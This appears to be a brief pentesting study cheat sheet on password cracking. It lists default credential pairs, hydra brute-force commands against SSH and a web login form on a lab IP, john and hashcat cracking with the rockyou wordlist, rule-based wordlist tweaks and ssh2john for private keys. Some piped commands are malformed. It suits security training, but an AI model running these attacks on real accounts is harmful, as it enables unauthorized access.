# Password Cracking

admin:admin admin:password root:root root:toor

Burpsuite if we want to

    john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt

    sudo gzip -d rockyou.txt.gz

    hydra -l noman -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.10.10

    hydra -l noman -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post

    hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

    hashcat -b | hashcat.exe -b (linux and window benchmark)

customize wordlists

    head /usr/share/wordlists/rockyou.txt > demo.txt | sed -i '/^1/d' demo.txt

if we want to add 1 in all password then | 

    echo \$1 > demo.rule | hashcat -r demo.rule --stdout demo.txt

    hash-identifier (find hash if simple)

    hashid (if id is available "$2y$10$)

    ssh2john id_rsa > ssh.hash | hashcat -h | grep -i "ssh" (port22)
